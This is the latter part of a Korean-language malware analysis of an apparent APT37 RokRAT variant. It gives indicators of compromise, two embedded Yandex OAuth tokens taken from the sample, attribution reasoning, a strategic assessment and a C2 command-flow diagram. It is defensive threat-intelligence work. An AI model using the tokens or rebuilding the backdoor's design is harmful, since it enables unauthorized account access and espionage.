## 8. IOC (Indicators of Compromise)

### 8.1 네트워크

| 카테고리 | 값 |
|---|---|
| C2 도메인 (Dropbox) | `api.dropboxapi[.]com`, `content.dropboxapi[.]com` |
| C2 도메인 (pCloud) | `api.pcloud[.]com`, `my.pcloud[.]com` |
| C2 도메인 (Yandex) | `cloud-api.yandex[.]net` |
| Multipart boundary | `--wwjaughalvncjwiajs--` |
| HTTP Authorization | `Authorization: OAuth y0__*` |
| 폴링 주기 | 76초 (1s + 5s×3 + 60s) |
| 스크린샷 주기 | 61초 |
| User-Agent | 비표준 (수동 빌드, 표준 브라우저 UA 아님) |

### 8.2 임베디드 자격증명 (Yandex OAuth Refresh Token)

```
Token #1: y0__xCvwqD6BxiitDUgtK7BqRJKUd5n0zFOnE5JA1vpobhCHkgkZg
Token #2: y0__xCgjYyMBxjIhDUgqp2umhIg72AOcJ1RXdfk-fIWhJrHtL7_Iw
```

### 8.3 암호학적 IOC

| 항목 | 값 |
|---|---|
| RSA Public Key SPKI SHA256 | `62b069a49c772367c2d7ace2f3fd45be53e8431549cc050ee8f8955eccc61326` |
| RSA Modulus SHA256 | `3253d1149320d7c706442c4fb7883d0ed84f9335af85ed7d4c12a2f3993ab5ae` |
| RSA publicExponent | `17` (비표준) |
| 페이로드 매직 footer | `0xEEEEEEEE` |
| 스크린샷 헤더 매직 | `FA DE AD BA` |
| 송신 nonce XOR 상수 | `0x3429AB7C` |
| 빌드/캠페인 ID | `292ACC33D2` |

### 8.4 호스트 아티팩트

| 카테고리 | 값 |
|---|---|
| 재감염 마커 | `HKCU\SOFTWARE\DefaultEdit\LastCheckedVersion = REG_DWORD 1` |
| Stage 1 드롭 위치 | `%TEMP%\vhelp.exe`, `%TEMP%\Volumeid1.exe`, `%TEMP%\version.dll` |
| Stage 2 임시파일 | `%TEMP%\TMP[XXXX].tmp` (즉시 삭제) |
| 페이로드 드롭 | `%TEMP%\*.tmp`, `%TEMP%\KB400928_doc.exe` |
| 스크린샷 임시 | `%TEMP%\{rand}.tmp` |
| 드라이브 인벤토리 | `%TEMP%\{drive_letter}_.TMP` |
| 클라우드 업로드 경로 (명령) | `/Program/<host_id>/` |
| 클라우드 업로드 경로 (유출) | `/Comment/<rand>292ACC33D2<rand>/` |

### 8.5 지속성 경로 (`'d'` 명령 정리 대상 → RokRAT 통상 경로)

```
%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\*.VBS
%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\*.lnk
%allusersprofile%\Microsoft\Windows\Start Menu\Programs\Startup\*.lnk
%appdata%\*.CMD
%appdata%\*.BAT
%appdata%\*01
```

### 8.6 FNV-1a 해시 트리거 (Stage 3 디코이 분기)

```
0x52076040 → KDI 보고서 URL 오픈
0x9F618F77 → 연합뉴스 기사 URL 오픈
```

### 8.7 표적 파일 확장자

```
Normal 모드: .XLS .DOC .PPT .TXT .M4A .AMR .PDF .HWP
All 모드: 모든 파일
```

---

## 9. Attribution 분석 — APT37 (ScarCruft)

### 9.1 APT37 일치 핵심 지표

| 지표 | 일치도 |
|---|---|
| HWP OLE 취약점 + 하이퍼링크 사이드로딩 체인 | ★★★★★ APT37 시그니처 침투 방식 |
| 북한 동향 디코이 (노동당 창건 80주년) | ★★★★★ 대북 분석 종사자 표적은 APT37 핵심 표적군 |
| HWP 파일 표적 (수집 확장자 명시) | ★★★★★ APT37 시그니처 표적 (RokRAT, Dolphin 등) |
| 한국 대북·정책연구·언론 표적 | ★★★★★ APT37 전통적 표적 영역 |
| 클라우드 OAuth dead-drop (Yandex/Dropbox/pCloud) | ★★★★★ RokRAT 변종에서 확인된 특징 |
| DLL 사이드로딩 + 다단계 메모리 전개 | ★★★★☆ APT37 후기 작전 표준화 패턴 |
| sRDI 계열 Reflective loader | ★★★★☆ APT37/Kimsuky 양쪽에서 관찰 |
| RSA-2048 + AES-128 하이브리드 암호 | ★★★★☆ RokRAT/Dolphin 계열 암호 구성 |
| 정상 라이브러리 카모플라주 (Crypto++ 등) | ★★★☆☆ 정교한 APT의 공통 특성 |

### 9.2 디코이 문서가 강화하는 Attribution

「북한 노동당 창건 80주년 행사 동향 종합」 미끼는 다음과 같은 측면에서 APT37 attribution을 강화한다.

1. **표적 정합성**: APT37의 핵심 표적은 한국의 대북 분석·통일·안보 정책 종사자로, 이 미끼는 그 표적군을 정확히 겨냥한다.
2. **운영 시기 정합성**: 노동당 창건일(10/10) 직전 빌드된 페이로드는 APT37의 "이벤트 시기 맞춤형 캠페인" 패턴과 일치한다.
3. **콘텐츠 친숙도**: 북한 노동당 행사 동향은 APT37 운영 주체가 가장 잘 아는 주제로, 외부에서 흉내내기 어려운 정밀한 표적 콘텐츠다.
4. **표적 심리 활용**: 분석 대상자(북한)의 행사를 분석가가 분석한다는 구조 자체가 사회공학적으로 정교하다.

### 9.3 비표준 기술 요소 (그룹 식별 단서)

| 요소 | 비고 |
|---|---|
| RSA `e=17` | 표준 e=65537 대신 사용 — 자체 키 생성 도구 흔적, 동일 그룹 다른 캠페인 매칭 가능 |
| `292ACC33D2` | 강력한 캠페인 IOC, 향후 동일 그룹 작전 추적 활용 |
| multipart boundary `--wwjaughalvncjwiajs--` | 고유 패턴, 네트워크 헌팅 시그너처 |
| FNV-1a 호스트 분기 (0x52076040, 0x9F618F77) | 사회공학적으로 사전 정찰된 표적 |
| HWP 하이퍼링크 → `%TEMP%\version.dll` 사이드로딩 체인 | 후속 변종 추적 IOC |

### 9.4 타 그룹 배제 사유

| 그룹 | 배제 사유 |
|---|---|
| Kimsuky (APT43) | 한국 표적은 일치하지만 클라우드 OAuth 다중 백엔드 + sRDI loader + HWP OLE 하이퍼링크 체인은 APT37 RokRAT 계열에 더 부합 |
| Lazarus | 한국 정책연구·언론 표적 영역 미일치 (Lazarus는 금융·암호화폐 중심) |
| APT38 / Andariel | 금전 동기 부재, 첩보 수집 성격이 명확 |

종합하면 표적의 정책연구·언론·대북분석 편향성과 클라우드 OAuth + HWP 조합, 그리고 RokRAT 패밀리의 기술적 시그니처가 APT37 RokRAT 변종 캠페인의 특성과 가장 정합한다.

---

## 10. 캠페인의 전략적 의의

1. **장기 정찰 기반 표적 선정**: FNV-1a 해시 기반 호스트 분기는 공격자가 사전에 표적 시스템의 EXE 파일명을 알고 있었음을 의미한다. 단순 대량 살포가 아닌 정밀 표적 캠페인이다.

2. **저상호작용 침투 벡터의 효율성**: 매크로 활성화나 EXE 실행 같은 의심 행위 없이 HWP 문서 내 하이퍼링크 클릭 한 번으로 침투가 완성된다. 보안 인식 교육만으로 차단하기 어려운 구조다.

3. **정상 인프라 악용 전략의 고도화**: Yandex Disk, Dropbox, pCloud를 동시에 운용하는 다중 백엔드 + 로컬 FS fallback 구조는 단일 서비스 차단으로 무력화되지 않으며, 정상 HTTPS 클라우드 트래픽으로 위장되어 네트워크 탐지를 극히 어렵게 만든다.

4. **공급망·운영 보안 위협**: HWP 문서 표적과 한국 공공기관 콘텐츠 미끼 활용은 한국 정부·연구기관 의사결정 정보가 지속적으로 외부에 노출되고 있음을 의미한다. 정책 결정 단계의 정보 우위가 잠재적 적대 행위자에게 이전될 가능성이 있다.

5. **활성 운영 캠페인**: Stage 2와 Stage 5 빌드 사이의 1개월 간격은 본 캠페인이 일회성이 아닌 지속적으로 빌드·운영되는 인프라임을 보여준다. 동일 캠페인 ID(`292ACC33D2`) 또는 유사 디코이 콘텐츠로 추적 헌팅이 필요하다.

6. **자율 정보 수집의 일상화**: 분당 1회의 자율 스크린샷은 봇이 단순 backdoor가 아니라 지속적 화면 감시 도구임을 보여준다. 표적의 업무 화면이 실시간에 가깝게 외부로 송신된다.

---

## 11. 핵심 발견 요약

1. **다중 클라우드 dead-drop 아키텍처**: Dropbox + pCloud + Yandex Disk 3채널 + 로컬 FS fallback. 정상 HTTPS 트래픽으로 위장되어 네트워크 탐지 극히 어려움.

2. **파일 메타데이터 = 명령 인코딩**: 클라우드 파일 이름의 첫 글자가 명령 코드. 페이로드 본문 없이도 단순 명령(`g`, `i`, `b` 등) 가능. 파일 자체가 통신 매체.

3. **이중 키 도출 시스템**: 같은 32B 엔트로피 풀이 AES 키 + XOR 키 테이블로 양면 활용. 키 관리 단순화와 다층 방어 동시 달성.

4. **이중 모드 OPSEC**: 프로브(`virtual`/`test`/`key`) vs 활성(`real`/`pack`/`team`) 모드 분리로 분석가의 fake C2 우회 방지.

5. **고유 빌드 식별자 `292ACC33D2`**: 모든 데이터 유출 경로에 고정 마커 포함. 동일 빌드/오퍼레이션 추적 가능.

6. **비표준 RSA `e=17`**: 자체 키 생성 도구 사용 흔적. 표준 도구(`openssl genrsa`)는 항상 `e=65537` 사용. 동일 그룹 다른 캠페인 매칭 키.

7. **HWP OLE + 하이퍼링크 체인**: 매크로 없이 단순 클릭만으로 페이로드 드롭 + 사이드로딩 완성. 사용자 인식 교육으로는 차단 어려움.

8. **시기 맞춤형 디코이**: 노동당 창건 80주년 직전 빌드. 사회공학적으로 정밀하게 시점을 노린 정확한 표적군 공격.

9. **디버거 텔레메트리**: 능동적 안티-디버그가 아닌 분석 환경 식별 마커. 운영자가 분석 트래픽을 사후 필터링 가능.

10. **자율 스크린샷 모듈**: 분당 1회 데스크탑 캡처. 표적 화면이 거의 실시간으로 외부 송신.

---

## 12. 분석 한계 및 후속 작업

### 12.1 본 분석으로 알 수 없는 것

- **C2 측 실행 페이로드 내용**: `'1'~'9'` 숫자 명령으로 다운로드되는 추가 페이로드의 정체. 현재 IOC만 추출됨.
- **언패킹 후 페이로드의 동적 동작**: 정적 분석 한계로 실제 C2 통신 결과 및 응답 처리 결과는 미확인.
- **HWP 파일 자체의 OLE 취약점 상세**: Stage 1 HWP 문서의 OLE 객체 정밀 분석 미수행. 트리거 URL과 파일 드롭 로직 추가 필요.
- **C2 측 인프라**: Yandex/Dropbox/pCloud 클라우드 계정 실제 운영 상태.

### 12.2 권장 후속 작업

1. **OAuth 토큰 폐기 신고**: Yandex 보안팀에 2개 토큰 abuse report → 인프라 즉시 차단.
2. **OAuth 토큰 유효성 추적** (법적/윤리적 검토 후): 토큰 활성 상태라면 폴더 내용을 통한 캠페인 범위 추적 가능.
3. **RSA 개인키 확보 시 트래픽 복호화**: 메모리 덤프에서 RX 키 풀(32B) 추출 → 봇 → C2 트래픽 일부 복호화 가능.
4. **Stage 1 HWP OLE 객체 정밀 분석**: 트리거 URL과 파일 드롭 로직.
5. **동일 캠페인 ID/디코이 헌팅**: `292ACC33D2` 또는 유사 디코이 콘텐츠로 추적.
6. **호환성 매트릭스**: Windows 버전·Office 버전별 안정 동작 범위 파악.

---

## 부록 A. 호출 흐름 다이어그램

```
[감염 봇]
   │
   ├─ c2_main_thread_loop (StartAddress @ 0x140015AD8)
   │     ├─ [C2 발견 단계]
   │     │  └─ for each c2_slot in g_c2_server_slots:
   │     │       ├─ c2_session_init
   │     │       ├─ c2_session_set_target (probe: virtual/test/key)
   │     │       ├─ c2_session_send_request
   │     │       └─ c2_session_recv_response
   │     │            └─ dispatch to:
   │     │                 ├─ c2_dropbox_handler  → parse_dropbox_response
   │     │                 ├─ c2_pcloud_handler   → parse_pcloud_response
   │     │                 ├─ c2_yandexdisk_handler → parse_yandexdisk_response
   │     │                 └─ c2_localfs_handler  → parse_local_filesystem
   │     │
   │     └─ [명령 처리 루프 (76초 주기)]
   │          └─ c2_command_dispatcher (sub_140012CD8)
   │               │
   │               ├─ [알파벳 명령]
   │               │   ├─ '0','i' → 스크린샷 토글
   │               │   ├─ 'b','j' → ExitProcess
   │               │   ├─ 'd','f' → 자기 정리 + 종료
   │               │   ├─ 'g'     → 하트비트
   │               │   ├─ 'h'     → 드라이브 인벤토리 (sub_14001233C)
   │               │   ├─ 'e'     → RCE (ShellExecuteW cmd.exe)
   │               │   └─ 'c'     → 파일 수집 (Normal/All)
   │               │
   │               └─ [숫자 명령 - 페이로드 실행]
   │                   ├─ '1','2' → WinINet download + memory exec
   │                   ├─ '3','4' → cloud + AES + XOR + memory exec
   │                   ├─ '5','6' → WinINet download + disk drop
   │                   └─ '7','8','9' → cloud + AES + XOR + disk drop
   │
   └─ [백그라운드 - 61초 주기]
        └─ sub_1400156A8 (capture_screenshot_and_upload)
             ├─ GDI capture + GDI+ JPEG encode
             ├─ XOR 4B key + AES-128-CBC + RSA-OAEP wrap
             └─ Upload to /Comment/<rand>292ACC33D2<rand>

[송신 암호화 흐름]
   tx_send_encrypted_msg (sub_1400119E4)
        ├─ generate ephemeral 16B AES key
        ├─ AES-128-CBC encrypt payload
        ├─ rsa_oaep_wrap_key (RSA-OAEP-SHA1 with e=17)
        └─ XOR with 0x3429AB7C nonce + send

[수신 복호화 흐름]
   aes128_cbc_decrypt_rx_ch2 (sub_1400182E0)
        ├─ derive_aes_key_iv_from_pool (32B → 16B+16B)
        │    ├─ key src: g_rx_key_pool_ch2_vec
        │    └─ iv src:  g_iv_salt_vec
        ├─ CryptoPP::Rijndael::Dec + CBC_Decryption
        ├─ XOR with g_xor_key_payload_32b (mod 32)
        └─ verify magic 0xEEEEEEEE at payload end
```

---
